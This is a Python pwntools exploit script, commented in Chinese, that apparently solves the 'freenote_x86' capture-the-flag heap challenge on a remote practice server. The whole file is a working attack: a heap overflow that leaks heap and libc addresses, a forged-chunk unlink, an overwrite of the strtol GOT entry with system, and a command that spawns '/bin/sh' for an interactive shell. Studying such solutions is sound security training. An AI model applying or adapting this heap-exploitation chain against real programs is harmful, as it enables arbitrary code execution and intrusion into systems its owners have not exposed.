# encoding=UTF-8
from pwn import *
import sys
context.log_level="debug"
# context.terminal = ['gnome-terminal','-x','sh','-c']
elf = ELF("./freenote_x86")
#本机环境
DEBUG =0
if DEBUG ==1:
    p = process('./freenote_x86')
    #此处使用ldd freenote_x86查看本机使用啥libc
    libc = elf.libc
#远程环境
else :
    p = remote("node4.buuoj.cn",25205)
    libc = ELF("./libc-old/libc-2.23-32.so")
#展示note
def list_():
    p.sendlineafter('choice: ','1')
#新建note
def new(payload):
    p.sendlineafter('choice: ','2')
    p.sendlineafter('new note: ',str(len(payload)))
    p.sendafter('note: ',payload)
#编辑note
def edit(num,payload):
    p.sendlineafter('choice: ','3')
    p.sendlineafter('number: ',str(num))
    p.sendlineafter('note: ',str(len(payload)))
    p.sendafter('your note: ',payload)
#删除note
def delete(num):
    p.sendlineafter('choice: ','4')
    p.sendlineafter('number: ',str(num))
#先新建一些note
new('a' * 0x40)   #0
new('b' * 0x40)   #1
new('c' * 0x40)   #2
new('d' * 0x40)   #3
new('e' * 0x40)   #4
delete(3)
delete(1)
edit(0,'a'*0x80+'c'*0x8)           # 此时造成堆溢出，覆盖下一个chunk的head，然后就可以print出下一个chunk的fk，bk指针了

list_()
p.recvuntil('c'*0x8)              # 收到覆盖的head的位置，接下来开始拿地址
log.progress("leak heap libc address: ")
#这里经调试发现不会被\x00截断，所以可以直接拿8个字符
fd_bk=p.recv(8)
fd=fd_bk[:4]
bk=fd_bk[4:]
heap_base = u32(fd) - 0xc18 - 0x88*3  # 减去前面几个块以及topchunk，到达堆基址
print "heap_base: ",hex(heap_base)

main_arena_48 = u32(bk)
print "main_arena_48: ",hex(main_arena_48)
libc_base = main_arena_48 - libc.sym['__memalign_hook'] - 48 - 0x20 # 0x10 ? 0x20 ?
print "libc_base: ",hex(libc_base)
success("leak heap libc address OK")
#这里开始unlink
log.progress("start unlink: ")
payload = flat(
            p32(0),                             # 先填充四字节的0
            p32(0x80),                          # 伪造chunk 0
            p32(heap_base + 0x8 + 0x10 - 0xC),       # 为了通过检查，伪造fd
            p32(heap_base + 0x8 + 0x10 - 0x8),       # 为了通过检查，伪造bk
            cyclic(0x80-0x10),                  # 新的填充量
            p32(0x80),                          # 伪造pre_size
            p32(0x88)                           # 伪造 size
)

edit(0,payload)
delete(1)                                      # 触发unlink
success("unlink OK")
#gdb.attach(p)
payload = flat(
            p32(2),                             # 当前存在的note数量
            p32(1),                             # 有效位
            p32(0x88),                          # note大小
            p32(heap_base+0x8+0x10),            # note地址
            p32(1),                             # 有效位
            p32(4),                             # note大小
            p32(elf.got['strtol'])              # 把指针变为指向got表中atoi函数
)
payload = payload.ljust(0x88,'p')
edit(0, payload)

print "heap_base_0x18: ",hex(heap_base+0x18)
print "got['strtol']: ", hex(elf.got['strtol'])     # 修改指向note1的指针为指向got表中atoi
# gdb.attach(p)

edit(1,p32(libc.sym['system']+libc_base))   #   写入system地址
print "libc.sym['system']+libc_base : ", hex(libc.sym['system']+libc_base)
# gdb.attach(p)

p.sendlineafter('choice: ','/bin/sh\x00')  # 发送system函数的参数
p.interactive()